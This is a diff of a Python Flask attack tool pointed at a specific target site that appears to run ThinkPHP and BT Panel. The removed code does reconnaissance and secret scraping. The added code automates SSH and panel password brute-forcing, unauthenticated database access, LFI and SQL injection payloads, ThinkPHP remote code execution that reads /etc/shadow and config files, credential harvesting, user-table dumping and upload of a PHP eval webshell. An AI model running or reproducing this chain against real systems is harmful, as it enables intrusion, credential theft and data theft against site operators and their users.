-        for path in bt_paths:
-            try:
-                url = f"http://{TARGET_IP}:{port}{path}"
-                r = requests.get(url, timeout=5, verify=False, 
-                               allow_redirects=True,
-                               headers={'User-Agent': 'Mozilla/5.0'})
-                
-                # Check for BT Panel indicators
-                bt_indicators = {
-                    'bt_keyword': 'bt' in r.text.lower() or 'baota' in r.text.lower(),
-                    'aaPanel': 'aapanel' in r.text.lower(),
-                    'login_form': 'login' in r.text.lower() and 'password' in r.text.lower(),
-                    'ssl_warning': 'ssl' in r.text.lower() and 'certificate' in r.text.lower(),
-                    'has_title': bool(re.search(r'<title>(.*?)</title>', r.text, re.IGNORECASE)),
-                }
-                
-                title_match = re.search(r'<title>(.*?)</title>', r.text, re.IGNORECASE)
-                
-                results.append({
-                    'url': url,
-                    'port': port,
-                    'service': service_name,
-                    'status': r.status_code,
-                    'title': title_match.group(1) if title_match else None,
-                    'length': len(r.text),
-                    'indicators': bt_indicators,
-                    'is_bt_panel': any(bt_indicators.values()),
-                    'snippet': r.text[:500]
-                })
-            except requests.exceptions.Timeout:
-                pass
-            except requests.exceptions.ConnectionError:
-                pass
-            except Exception as e:
-                pass
-    
-    return jsonify(results)
-
-@app.route('/hunt/scan-common-ports')
-def scan_common_ports():
-    """Enhanced port scanning"""
+def _scan_ports():
+    """Internal port scanning"""
     ports = [
-        (21, 'FTP'),
-        (22, 'SSH'),
-        (25, 'SMTP'),
-        (53, 'DNS'),
-        (80, 'HTTP'),
-        (110, 'POP3'),
-        (143, 'IMAP'),
-        (443, 'HTTPS'),
-        (465, 'SMTPS'),
-        (587, 'SMTP (Submission)'),
-        (993, 'IMAPS'),
-        (995, 'POP3S'),
-        (3306, 'MySQL'),
-        (3389, 'RDP'),
-        (5432, 'PostgreSQL'),
-        (6379, 'Redis'),
-        (8080, 'HTTP-Alt'),
-        (8443, 'HTTPS-Alt'),
-        (8888, 'BT Panel'),
-        (888, 'BT Panel Old'),
-        (9090, 'Cockpit'),
-        (27017, 'MongoDB'),
-        (11211, 'Memcached'),
-        (9200, 'Elasticsearch'),
-        (5900, 'VNC'),
-        (3000, 'Grafana/Node.js'),
-        (4000, 'Node.js/React'),
-        (5000, 'Flask/Python'),
-        (7001, 'WebLogic'),
-        (8089, 'Splunk'),
-        (9000, 'PHP-FPM'),
-        (10000, 'Webmin'),
+        (21, 'FTP'), (22, 'SSH'), (25, 'SMTP'), (53, 'DNS'),
+        (80, 'HTTP'), (110, 'POP3'), (143, 'IMAP'), (443, 'HTTPS'),
+        (465, 'SMTPS'), (587, 'SMTP'), (993, 'IMAPS'), (995, 'POP3S'),
+        (3306, 'MySQL'), (3389, 'RDP'), (5432, 'PostgreSQL'),
+        (6379, 'Redis'), (8080, 'HTTP-Alt'), (8443, 'HTTPS-Alt'),
+        (8888, 'BT Panel'), (888, 'BT Panel Old'), (9090, 'Cockpit'),
+        (27017, 'MongoDB'), (11211, 'Memcached'), (9200, 'Elasticsearch'),
+        (5900, 'VNC'), (3000, 'Grafana'), (5000, 'Flask'),
+        (7001, 'WebLogic'), (8089, 'Splunk'), (9000, 'PHP-FPM'),
+        (10000, 'Webmin'), (6379, 'Redis'),
     ]
     
-    def check_port(port, service):
+    open_ports = []
+    for port, service in ports:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(2)
             result = sock.connect_ex((TARGET_IP, port))
             sock.close()
-            
-            # Try HTTP connection on open ports
-            http_result = None
             if result == 0:
-                try:
-                    r = requests.get(f"http://{TARGET_IP}:{port}", timeout=3, verify=False)
-                    http_result = {
-                        'status': r.status_code,
-                        'title': re.search(r'<title>(.*?)</title>', r.text, re.IGNORECASE)
-                    }
-                    if http_result['title']:
-                        http_result['title'] = http_result['title'].group(1)
-                except:
-                    pass
-            
-            return {
-                'port': port,
-                'service': service,
-                'open': result == 0,
-                'http_response': http_result
-            }
-        except:
-            return {'port': port, 'service': service, 'open': False}
-    
-    # Concurrent port scanning
-    results = []
-    with ThreadPoolExecutor(max_workers=30) as executor:
-        futures = [executor.submit(check_port, port, service) for port, service in ports]
-        for future in as_completed(futures):
-            results.append(future.result())
-    
-    results.sort(key=lambda x: x['port'])
-    return jsonify(results)
-
-# ============================================================
-# ADVANCED VUE.JS SOURCE ANALYSIS
-# ============================================================
-@app.route('/hunt/extract-js')
-def extract_js():
-    """Enhanced JavaScript analysis"""
-    js_files = [
-        '/static/js/app.aca0396932bf42fa0d8.js',
-        '/static/js/manifest.e96b770b60e9f2607abc.js',
-        '/static/js/9.a9b22fa2a69315eb5580.js',
-        '/static/js/app.js',
-        '/static/js/manifest.js',
-        '/static/js/vendor.js',
-        '/static/js/chunk-vendors.js',
-        '/static/js/app.*.js',
-    ]
-    
-    results = {}
-    
-    def analyze_js(js_file):
-        try:
-            r = requests.get(f"{TARGET}{js_file}", timeout=15, verify=False)
-            if r.status_code == 200:
-                code = r.text
-                
-                findings = {
-                    'file': js_file,
-                    'size': len(code),
-                    'size_kb': round(len(code) / 1024, 2),
-                    
-                    # API Endpoints
-                    'api_endpoints': list(set(re.findall(
-                        r"""['"](/[a-zA-Z0-9/_-]*(?:api|login|register|admin|user|deposit|withdraw|balance|transaction|wallet|recharge|transfer|exchange|order|strategy|team|earn|profit|payment)[a-zA-Z0-9/_-]*)['"]""",
-                        code, re.IGNORECASE
-                    ))),
-                    
-                    # Admin Routes
-                    'admin_routes': list(set(re.findall(
-                        r"""['"](/[a-zA-Z0-9/_-]*admin[a-zA-Z0-9/_-]*)['"]""",
-                        code, re.IGNORECASE
-                    ))),
-                    
-                    # Tokens & Keys
-                    'tokens_keys': list(set(re.findall(
-                        r'(?:token|key|secret|password|auth|api_key|app_key|app_secret|access_token|refresh_token)\s*[:=]\s*["\'][^"\']{4,}["\']',
-                        code, re.IGNORECASE
-                    ))),
-                    
-                    # Vue Routes
-                    'vue_routes': list(set(re.findall(
-                        r'path\s*:\s*["\']([^"\']+)["\']',
-                        code
-                    ))),
-                    
-                    # HTTP Calls
-                    'fetch_calls': list(set(re.findall(
-                        r'fetch\s*\(\s*["\']([^"\']+)["\']',
-                        code
-                    ))),
-                    
-                    'axios_calls': list(set(re.findall(
-                        r'(?:axios\.(?:get|post|put|delete|patch)\s*\(\s*["\']|baseURL\s*:\s*["\'])([^"\']+)["\']',
-                        code
-                    ))),
-                    
-                    # Hidden Functions
-                    'auth_functions': list(set(re.findall(
-                        r'(?:function|const|let|var)\s+(?:isAdmin|isAuth|checkAdmin|adminCheck|hasPermission|canEdit|canDelete|canWithdraw|isVIP|checkBalance|isLogin|getToken|setToken|clearToken)[^}]+',
-                        code, re.IGNORECASE
-                    ))),
-                    
-                    # Storage Keys
-                    'localstorage_keys': list(set(re.findall(
-                        r'localStorage\.(?:getItem|setItem)\s*\(\s*["\']([^"\']+)["\']',
-                        code
-                    ))),
-                    
-                    'sessionstorage_keys': list(set(re.findall(
-                        r'sessionStorage\.(?:getItem|setItem)\s*\(\s*["\']([^"\']+)["\']',
-                        code
-                    ))),
-                    
-                    # Cookie references
-                    'cookie_refs': list(set(re.findall(
-                        r'document\.cookie[^;]+',
-                        code
-                    ))),
-                    
-                    # WebSocket endpoints
-                    'websocket_endpoints': list(set(re.findall(
-                        r'(?:ws|wss):\/\/[^\s"\']+',
-                        code
-                    ))),
-                    
-                    # Comments with potential info
-                    'interesting_comments': list(set(re.findall(
-                        r'\/\/.*(?:TODO|FIXME|HACK|DEBUG|TEMP|TEST|ADMIN|PASSWORD|SECRET|KEY)[^\n]*',
-                        code, re.IGNORECASE
-                    ))),
-                }
-                
-                # Remove empty lists
-                findings = {k: v for k, v in findings.items() if v or k in ['file', 'size', 'size_kb']}
-                
-                return js_file, findings
-        except Exception as e:
-            return js_file, {'error': str(e)}
-    
-    # Concurrent execution
-    with ThreadPoolExecutor(max_workers=10) as executor:
-        futures = [executor.submit(analyze_js, js_file) for js_file in js_files]
-        for future in as_completed(futures):
-            js_file, findings = future.result()
-            results[js_file] = findings
-    
-    return jsonify(results)
-
-# ============================================================
-# ENHANCED API DISCOVERY
-# ============================================================
-@app.route('/hunt/api-discovery')
-def api_discovery():
-    """Comprehensive API endpoint discovery"""
-    base_url = f"{TARGET}/index.php"
-    
-    endpoints = [
-        # Authentication
-        'api/login', 'api/register', 'api/logout', 'api/refresh_token',
-        'api/forgot_password', 'api/reset_password', 'api/verify_email',
-        'api/send_code', 'api/verify_code',
-        
-        # User Management
-        'api/user', 'api/user/info', 'api/user/profile', 'api/user/balance',
-        'api/user/update', 'api/user/avatar', 'api/user/password',
-        'api/user/settings', 'api/user/preferences', 'api/user/security',
-        'api/user/kyc', 'api/user/verify', 'api/user/bind',
-        
-        # Wallet & Finance
-        'api/wallet', 'api/wallet/list', 'api/wallet/add',
-        'api/wallet/remove', 'api/wallet/default',
-        'api/recharge', 'api/recharge/list', 'api/recharge/create',
-        'api/recharge/callback', 'api/recharge/cancel',
-        'api/withdraw', 'api/withdraw/list', 'api/withdraw/create',
-        'api/withdraw/cancel', 'api/withdraw/fee',
-        'api/transfer', 'api/transfer/create', 'api/transfer/history',
-        'api/transfer/confirm',
-        
-        # Exchange & Trading
-        'api/exchange', 'api/exchange/rate', 'api/exchange/convert',
-        'api/exchange/history', 'api/exchange/fee',
-        'api/trade', 'api/trade/buy', 'api/trade/sell',
-        'api/trade/history', 'api/trade/cancel',
-        
-        # Orders & Transactions
-        'api/transaction', 'api/transaction/list', 'api/transaction/detail',
-        'api/transaction/export', 'api/transaction/stats',
-        'api/order', 'api/order/list', 'api/order/create',
-        'api/order/cancel', 'api/order/detail',
-        
-        # Strategy & Investment
-        'api/strategy', 'api/strategy/list', 'api/strategy/detail',
-        'api/strategy/subscribe', 'api/strategy/unsubscribe',
-        'api/investment', 'api/investment/list', 'api/investment/create',
-        
-        # Team & Referral
-        'api/team', 'api/team/report', 'api/team/members',
-        'api/team/commission', 'api/team/level',
-        'api/referral', 'api/referral/code', 'api/referral/stats',
-        
-        # Earnings & Profit
-        'api/earnings', 'api/earnings/list', 'api/earnings/stats',
-        'api/profit', 'api/profit/list', 'api/profit/withdraw',
-        'api/income', 'api/income/list', 'api/income/stats',
-        
-        # Activity & News
-        'api/activity', 'api/activity/list', 'api/activity/join',
-        'api/news', 'api/news/list', 'api/news/detail',
-        'api/notice', 'api/notice/list', 'api/notice/detail',
-        'api/help', 'api/help/list', 'api/help/detail',
-        'api/article', 'api/article/list', 'api/article/detail',
-        
-        # Admin Endpoints
-        'api/admin', 'api/admin/login', 'api/admin/users',
-        'api/admin/stats', 'api/admin/dashboard',
-        'api/admin/settings', 'api/admin/config',
-        'api/admin/recharges', 'api/admin/withdrawals',
-        'api/admin/orders', 'api/admin/transactions',
-        'api/admin/system', 'api/admin/logs',
-        
-        # Config & System
-        'api/config', 'api/settings', 'api/version',
-        'api/health', 'api/ping', 'api/status',
-        'api/time', 'api/server_info',
-        
-        # File Upload
-        'api/upload', 'api/upload/image', 'api/upload/file',
-        'api/file', 'api/file/download',
-        
-        # Direct module/controller
-        'user/login', 'user/register', 'user/info', 'user/profile',
-        'user/AddTikuan', 'user/Tikuanmanage', 'user/wallet',
-        'user/recharge', 'user/withdraw', 'user/transfer',
-        'admin/index', 'admin/login', 'admin/users',
-        'admin/settings', 'admin/system',
-        'index/index', 'home/index', 'api/index',
-    ]
-    
-    results = []
-    session = get_session()
-    
-    def test_endpoint(endpoint):
-        try:
-            # Test GET
-            url = f"{base_url}?s={endpoint}"
-            r = session.get(url, timeout=10, verify=False,
-                          headers={'Cookie': 'username=TWFydWZiZWxheQ=='})
-            
-            if r.status_code != 404 and 'module not exists' not in r.text.lower():
-                # Analyze response
-                has_json = r.headers.get('Content-Type', '').startswith('application/json')
-                has_data = len(r.text) > 50
-                
-                return {
-                    'endpoint': endpoint,
-                    'method': 'GET',
-                    'status': r.status_code,
-                    'length': len(r.text),
-                    'is_json': has_json,
-                    'has_data': has_data,
-                    'snippet': r.text[:300]
-                }
-            
-            # Test POST
-            r = session.post(url, timeout=10, verify=False,
-                           json={"test": 1},
-                           headers={
-                               'Content-Type': 'application/json',
-                               'Cookie': 'username=TWFydWZiZWxheQ=='
-                           })
-            
-            if r.status_code != 404 and 'module not exists' not in r.text.lower():
-                return {
-                    'endpoint': endpoint,
-                    'method': 'POST',
-                    'status': r.status_code,
-                    'length': len(r.text),
-                    'is_json': r.headers.get('Content-Type', '').startswith('application/json'),
-                    'has_data': len(r.text) > 50,
-                    'snippet': r.text[:300]
-                }
+                open_ports.append({'port': port, 'service': service, 'ip': TARGET_IP})
+                # Try banner grabbing
+                banner = _grab_banner(TARGET_IP, port)
+                if banner:
+                    open_ports[-1]['banner'] = banner
         except:
             pass
-        return None
     
-    # Concurrent execution
-    with ThreadPoolExecutor(max_workers=20) as executor:
-        futures = [executor.submit(test_endpoint, endpoint) for endpoint in endpoints]
-        for future in as_completed(futures):
-            result = future.result()
-            if result:
-                results.append(result)
+    add_to_attack_state('open_ports', [f"{p['port']}/{p['service']}" for p in open_ports])
+    return open_ports
+
+def _grab_banner(ip, port):
+    """Grab service banner"""
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(3)
+        sock.connect((ip, port))
+        sock.send(b'HEAD / HTTP/1.0\r\n\r\n')
+        banner = sock.recv(1024).decode('utf-8', errors='ignore')
+        sock.close()
+        return banner[:500]
+    except:
+        return None
+
+def _exploit_open_ports():
+    """Try to exploit discovered open ports"""
+    results = {}
+    
+    for port_info in attack_state['open_ports']:
+        port_str = port_info.split('/')[0]
+        port = int(port_str)
+        
+        if port == 22:
+            results['ssh'] = _try_ssh_bruteforce()
+        elif port == 21:
+            results['ftp'] = _try_ftp_anonymous()
+        elif port == 3306:
+            results['mysql'] = _try_mysql_default()
+        elif port == 6379:
+            results['redis'] = _try_redis_unauth()
+        elif port == 27017:
+            results['mongodb'] = _try_mongodb_unauth()
+        elif port in [8888, 888]:
+            results['bt_panel'] = _attack_bt_panel()
+    
+    return results
+
+def _try_ssh_bruteforce():
+    """Try common SSH credentials"""
+    common_creds = [
+        ('root', 'root'), ('root', 'admin'), ('root', '123456'),
+        ('root', 'password'), ('admin', 'admin'), ('admin', '123456'),
+        ('root', ''), ('admin', ''), ('root', 'toor'),
+    ]
+    for username, password in common_creds[:5]:  # Limit attempts
+        try:
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            ssh.connect(TARGET_IP, port=22, username=username, password=password, timeout=5)
+            ssh.close()
+            creds = f"{username}:{password}"
+            add_to_attack_state('discovered_credentials', [creds])
+            return {'success': True, 'credentials': creds}
+        except:
+            pass
+    return {'success': False, 'message': 'SSH brute force failed'}
+
+def _try_ftp_anonymous():
+    """Try FTP anonymous login"""
+    try:
+        ftp = ftplib.FTP()
+        ftp.connect(TARGET_IP, 21, timeout=5)
+        ftp.login('anonymous', 'anonymous')
+        files = ftp.nlst()
+        ftp.quit()
+        add_to_attack_state('discovered_credentials', ['anonymous:anonymous'])
+        return {'success': True, 'files': files[:50]}
+    except:
+        return {'success': False}
+
+def _try_mysql_default():
+    """Try MySQL default credentials"""
+    try:
+        conn = pymysql.connect(
+            host=TARGET_IP, port=3306,
+            user='root', password='',
+            connect_timeout=5
+        )
+        cursor = conn.cursor()
+        cursor.execute("SELECT VERSION()")
+        version = cursor.fetchone()
+        conn.close()
+        add_to_attack_state('database_info', {'type': 'mysql', 'host': TARGET_IP, 'version': str(version)})
+        add_to_attack_state('discovered_credentials', ['root:'])
+        return {'success': True, 'version': str(version)}
+    except:
+        return {'success': False}
+
+def _try_redis_unauth():
+    """Try Redis unauthorized access"""
+    try:
+        r = redis.Redis(host=TARGET_IP, port=6379, socket_timeout=5)
+        r.ping()
+        info = r.info()
+        add_to_attack_state('database_info', {'type': 'redis', 'host': TARGET_IP})
+        return {'success': True, 'info': str(info)[:500]}
+    except:
+        return {'success': False}
+
+def _try_mongodb_unauth():
+    """Try MongoDB unauthorized access"""
+    try:
+        from pymongo import MongoClient
+        client = MongoClient(TARGET_IP, 27017, serverSelectionTimeoutMS=5000)
+        dbs = client.list_database_names()
+        client.close()
+        add_to_attack_state('database_info', {'type': 'mongodb', 'host': TARGET_IP, 'databases': dbs})
+        return {'success': True, 'databases': dbs}
+    except:
+        return {'success': False}
+
+# ============================================================
+# BT PANEL ATTACKS
+# ============================================================
+def _attack_bt_panel():
+    """Attack BT Panel with discovered info"""
+    results = {}
+    
+    # Try default BT Panel credentials
+    bt_creds = [
+        ('admin', 'admin'), ('admin', '123456'), ('admin', 'admin123'),
+        ('root', 'root'), ('admin', 'password'),
+    ]
+    
+    # If we found the panel, try login
+    bt_ports = [8888, 888, 7800]
+    for port in bt_ports:
+        for username, password in bt_creds[:3]:
+            try:
+                session = requests.Session()
+                # Get CSRF token
+                r = session.get(f"http://{TARGET_IP}:{port}/login", timeout=5)
+                # Try login
+                login_data = {
+                    'username': username,
+                    'password': password,
+                }
+                r = session.post(f"http://{TARGET_IP}:{port}/login", data=login_data, timeout=5)
+                if 'dashboard' in r.text.lower() or 'success' in r.text.lower():
+                    creds = f"bt_panel:{username}:{password}"
+                    add_to_attack_state('discovered_credentials', [creds])
+                    attack_state['bt_panel_url'] = f"http://{TARGET_IP}:{port}"
+                    results['bt_login'] = {'success': True, 'credentials': creds, 'port': port}
+                    return results
+            except:
+                pass
+    
+    return {'bt_login': {'success': False}}
+
+# ============================================================
+# LFI & SQLI TESTING
+# ============================================================
+def _test_lfi():
+    """Test for Local File Inclusion"""
+    lfi_payloads = [
+        '../../../etc/passwd',
+        '../../../../etc/passwd',
+        '....//....//....//etc/passwd',
+        '..%2F..%2F..%2Fetc%2Fpasswd',
+        'php://filter/convert.base64-encode/resource=index',
+        'php://filter/read=convert.base64-encode/resource=config/database',
+    ]
+    
+    vulnerable = []
+    for endpoint in attack_state['discovered_endpoints'][:10]:
+        for payload in lfi_payloads[:3]:
+            try:
+                url = f"{TARGET}{endpoint}?file={payload}"
+                r = requests.get(url, timeout=10, verify=False)
+                if 'root:' in r.text or 'www-data' in r.text or 'mysql' in r.text:
+                    vulnerable.append({'endpoint': endpoint, 'payload': payload})
+                    add_to_attack_state('lfi_vulnerabilities', [f"{endpoint}?file={payload}"])
+            except:
+                pass
+    
+    return {'vulnerable': vulnerable}
+
+def _test_sqli():
+    """Test for SQL Injection"""
+    sqli_payloads = [
+        "' OR '1'='1",
+        "' OR '1'='1' --",
+        "admin' --",
+        "' UNION SELECT NULL--",
+        "1' AND '1'='1",
+        "1' AND '1'='2",
+    ]
+    
+    vulnerable = []
+    for endpoint in attack_state['discovered_endpoints'][:10]:
+        for payload in sqli_payloads[:3]:
+            try:
+                # Test GET parameter
+                r = requests.get(f"{TARGET}{endpoint}?id={payload}", timeout=10, verify=False)
+                if 'sql' in r.text.lower() or 'mysql' in r.text.lower() or 'syntax' in r.text.lower():
+                    vulnerable.append({'endpoint': endpoint, 'method': 'GET', 'payload': payload})
+                    add_to_attack_state('sqli_vulnerabilities', [f"{endpoint}?id={payload}"])
+            except:
+                pass
+    
+    return {'vulnerable': vulnerable}
+
+# ============================================================
+# POST-EXPLOITATION
+# ============================================================
+def _deep_rce_exploitation():
+    """Deep exploitation using verified RCE"""
+    commands = [
+        'whoami', 'id', 'uname -a', 'pwd',
+        'ls -la /', 'ls -la /www/wwwroot/',
+        'cat /etc/passwd', 'cat /etc/shadow',
+        'find / -name "*.conf" -o -name "*.ini" -o -name "*.env" 2>/dev/null | head -20',
+        'find / -name "database.php" -o -name "config.php" 2>/dev/null | head -10',
+        'ps aux | grep -E "mysql|redis|nginx|apache|php"',
+        'netstat -tlnp',
+        'cat /www/server/panel/data/default.db 2>/dev/null | strings',
+    ]
+    
+    results = []
+    for cmd in commands:
+        try:
+            payload = f"/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={cmd}"
+            r = requests.get(f"{TARGET}{payload}", timeout=15, verify=False)
+            if r.status_code == 200 and len(r.text) > 20:
+                results.append({'command': cmd, 'output': r.text[:500]})
+                
+                # Extract credentials from output
+                if 'password' in r.text.lower() or 'pass' in r.text.lower():
+                    creds = re.findall(r'(?:password|passwd|pwd)\s*[=:]\s*["\']?([^"\'&\s]{3,})', r.text, re.IGNORECASE)
+                    if creds:
+                        add_to_attack_state('discovered_credentials', creds)
+        except:
+            pass
+    
+    return results
+
+def _extract_database_data():
+    """Extract data from compromised database"""
+    results = {}
+    
+    if 'mysql' in str(attack_state['database_info']).lower():
+        try:
+            conn = pymysql.connect(
+                host=TARGET_IP, port=3306,
+                user='root', password='',
+                connect_timeout=5
+            )
+            cursor = conn.cursor()
+            
+            # Get all databases
+            cursor.execute("SHOW DATABASES")
+            databases = cursor.fetchall()
+            
+            for db in databases[:5]:
+                db_name = db[0]
+                cursor.execute(f"USE {db_name}")
+                cursor.execute("SHOW TABLES")
+                tables = cursor.fetchall()
+                
+                # Try to get users table
+                for table in tables:
+                    table_name = table[0]
+                    if 'user' in table_name.lower() or 'admin' in table_name.lower():
+                        try:
+                            cursor.execute(f"SELECT * FROM {table_name} LIMIT 10")
+                            rows = cursor.fetchall()
+                            results[f"{db_name}.{table_name}"] = {
+                                'columns': [desc[0] for desc in cursor.description],
+                                'row_count': len(rows)
+                            }
+                        except:
+                            pass
+            
+            conn.close()
+            add_to_attack_state('database_info', {'extracted': True, 'databases': [db[0] for db in databases]})
+        except:
+            pass
+    
+    return results
+
+def _upload_webshell():
+    """Try to upload webshell via discovered upload endpoints"""
+    webshell_code = '<?php @eval($_POST["cmd"]); ?>'
+    results = []
+    
+    for endpoint in attack_state['upload_endpoints'][:5]:
+        try:
+            files = {'file': ('shell.php', webshell_code, 'application/x-php')}
+            r = requests.post(f"{TARGET}{endpoint}", files=files, timeout=10, verify=False)
+            if r.status_code == 200:
+                # Try to guess webshell location
+                potential_paths = [
+                    f"{TARGET}/uploads/shell.php",
+                    f"{TARGET}/upload/shell.php",
+                    f"{TARGET}/shell.php",
+                ]
+                for path in potential_paths:
+                    try:
+                        r2 = requests.get(path, timeout=5)
+                        if r2.status_code == 200 and 'eval' in r2.text:
+                            add_to_attack_state('webshell_locations', [path])
+                            results.append({'success': True, 'url': path})
+                    except:
+                        pass
+        except:
+            pass
+    
+    return results
+
+# ============================================================
+# ENHANCED EXISTING ENDPOINTS
+# ============================================================
+@app.route('/hunt/thinkphp-config')
+def thinkphp_config():
+    """Enhanced config extraction with auto-exploitation"""
+    payloads = [
+        '/index.php?s=index/think\\config/get&name=database',
+        '/index.php?s=index/think\\config/get&name=database.password',
+        '/index.php?s=index/think\\config/get&name=database.username',
+        '/index.php?s=index/think\\config/get&name=database.hostname',
+        '/index.php?s=index/think\\config/get&name=database.database',
+        '/index.php?s=index/think\\config/get&name=app',
+        '/index.php?s=index/think\\config/get&name=app.app_key',
+        '/index.php?s=index/think\\config/get&name=app.app_secret',
+        '/index.php?s=index/think\\config/get&name=cache',
+        '/index.php?s=index/think\\config/get&name=session',
+        '/index.php?s=index/think\\config/get&name=cookie',
+    ]
+    
+    results = []
+    for p in payloads:
+        try:
+            r = requests.get(f"{TARGET}{p}", timeout=10, verify=False)
+            
+            # Extract sensitive data
+            db_info = {}
+            if 'password' in r.text.lower():
+                pass_match = re.findall(r'(?:password|passwd|pwd)\s*[=:]\s*["\']?([^"\'&\s]+)', r.text, re.IGNORECASE)
+                if pass_match:
+                    db_info['passwords'] = pass_match
+            
+            if 'hostname' in r.text.lower() or 'host' in r.text.lower():
+                host_match = re.findall(r'(?:hostname|host|server)\s*[=:]\s*["\']?([^"\'&\s]+)', r.text, re.IGNORECASE)
+                if host_match:
+                    db_info['hosts'] = host_match
+            
+            if db_info:
+                add_to_attack_state('database_info', db_info)
+            
+            results.append({
+                'payload': p,
+                'status': r.status_code,
+                'length': len(r.text),
+                'extracted_info': db_info if db_info else None,
+                'snippet': r.text[:1000]
+            })
+        except:
+            pass
+    
+    return jsonify(results)
+
+@app.route('/hunt/rce-payloads')
+def rce_payloads():
+    """Enhanced RCE with automatic exploitation chaining"""
+    payloads = [
+        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami',
+        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id',
+        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=uname -a',
+        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /etc/passwd',
+        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=env',
+        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=netstat -an',
+        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ps aux',
+        '/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls -la /www/wwwroot/',
+    ]
+    
+    results = []
+    for p in payloads:
+        try:
+            r = requests.get(f"{TARGET}{p}", timeout=15, verify=False)
+            is_rce = False
+            
+            if r.status_code == 200 and len(r.text) > 20:
+                if 'uid=' in r.text or 'gid=' in r.text:
+                    is_rce = True
+                elif 'root:' in r.text:
+                    is_rce = True
+                elif 'www' in r.text and ('drwx' in r.text or 'total' in r.text):
+                    is_rce = True
+                elif 'tcp' in r.text and 'LISTEN' in r.text:
+                    is_rce = True
+            
+            if is_rce:
+                attack_state['rce_verified'] = True
+                add_to_attack_state('vulnerable_params', [p])
+                
+                # Auto-extract useful info
+                if 'passwd' in p:
+                    users = re.findall(r'^(\w+):', r.text, re.MULTILINE)
+                    if users:
+                        add_to_attack_state('discovered_credentials', users)
+                
+                if 'env' in p:
+                    env_vars = re.findall(r'(\w+)=(.*)', r.text)
+                    for key, value in env_vars:
+                        if any(s in key.lower() for s in ['pass', 'secret', 'key', 'token', 'db', 'database']):
+                            add_to_attack_state('discovered_credentials', [f"{key}={value}"])
+            
+            results.append({
+                'payload': p,
+                'status': r.status_code,
+                'length': len(r.text),
+                'rce_verified': is_rce,
+                'snippet': r.text[:1000]
+            })
+        except:
+            pass
     
     return jsonify(results)
 
 # ============================================================
-# SECURITY HEADERS CHECK - Enhanced
-# ============================================================
-@app.route('/hunt/headers')
-def check_headers():
-    """Enhanced security headers analysis"""
-    try:
-        r = requests.get(f"{TARGET}/", timeout=10, verify=False)
-        
-        security_headers = {
-            'X-Frame-Options': r.headers.get('X-Frame-Options', 'MISSING'),
-            'X-Content-Type-Options': r.headers.get('X-Content-Type-Options', 'MISSING'),
-            'Content-Security-Policy': r.headers.get('Content-Security-Policy', 'MISSING'),
-            'X-XSS-Protection': r.headers.get('X-XSS-Protection', 'MISSING'),
-            'Strict-Transport-Security': r.headers.get('Strict-Transport-Security', 'MISSING'),
-            'Referrer-Policy': r.headers.get('Referrer-Policy', 'MISSING'),
-            'Permissions-Policy': r.headers.get('Permissions-Policy', 'MISSING'),
-            'Feature-Policy': r.headers.get('Feature-Policy', 'MISSING'),
-            'Server': r.headers.get('Server', 'MISSING'),
-            'X-Powered-By': r.headers.get('X-Powered-By', 'MISSING'),
-            'X-AspNet-Version': r.headers.get('X-AspNet-Version', 'MISSING'),
-            'X-AspNetMvc-Version': r.headers.get('X-AspNetMvc-Version', 'MISSING'),
-        }
-        
-        # Analyze vulnerabilities
-        vulnerabilities = []
-        severity_map = {
-            'X-Frame-Options': ('Clickjacking possible', 'MEDIUM'),
-            'Content-Security-Policy': ('XSS risk increased', 'HIGH'),
-            'Strict-Transport-Security': ('SSL stripping possible', 'MEDIUM'),
-            'X-Content-Type-Options': ('MIME sniffing possible', 'LOW'),
-            'X-XSS-Protection': ('XSS filter not enforced', 'MEDIUM'),
-            'Referrer-Policy': ('Referrer leakage possible', 'LOW'),
-            'Permissions-Policy': ('Feature abuse possible', 'LOW'),
-        }
-        
-        for header, (description, severity) in severity_map.items():
-            if security_headers[header] == 'MISSING':
-                vulnerabilities.append({
-                    'header': header,
-                    'issue': description,
-                    'severity': severity
-                })
-        
-        # Server info disclosure
-        if security_headers['Server'] != 'MISSING':
-            vulnerabilities.append({
-                'header': 'Server',
-                'issue': f'Server info exposed: {security_headers["Server"]}',
-                'severity': 'LOW'
-            })
-        
-        if security_headers['X-Powered-By'] != 'MISSING':
-            vulnerabilities.append({
-                'header': 'X-Powered-By',
-                'issue': f'Technology info exposed: {security_headers["X-Powered-By"]}',
-                'severity': 'LOW'
-            })
-        
-        # Check cookies
-        cookies_info = []
-        for cookie in r.cookies:
-            cookie_info = {
-                'name': cookie.name,
-                'secure': cookie.secure,
-                'httponly': cookie.has_nonstandard_attr('httponly'),
-                'samesite': cookie.has_nonstandard_attr('samesite'),
-            }
-            cookies_info.append(cookie_info)
-            
-            if not cookie.secure:
-                vulnerabilities.append({
-                    'header': f'Cookie: {cookie.name}',
-                    'issue': 'Cookie missing Secure flag',
-                    'severity': 'MEDIUM'
-                })
-            if not cookie.has_nonstandard_attr('httponly'):
-                vulnerabilities.append({
-                    'header': f'Cookie: {cookie.name}',
-                    'issue': 'Cookie missing HttpOnly flag',
-                    'severity': 'MEDIUM'
-                })
-        
-        return jsonify({
-            'headers': security_headers,
-            'cookies': cookies_info,
-            'vulnerabilities': vulnerabilities,
-            'total_vulnerabilities': len(vulnerabilities),
-            'all_headers': dict(r.headers)
-        })
-    except Exception as e:
-        return jsonify({'error': str(e)})
-
-# ============================================================
-# HEALTH CHECK
+# HEALTH & STATUS
 # ============================================================
 @app.route('/health')
 def health():
     return jsonify({
-        'status': 'healthy',
+        'status': 'operational',
         'timestamp': datetime.now().isoformat(),
         'target': TARGET,
-        'cache_size': len(cache)
+        'attack_state': {
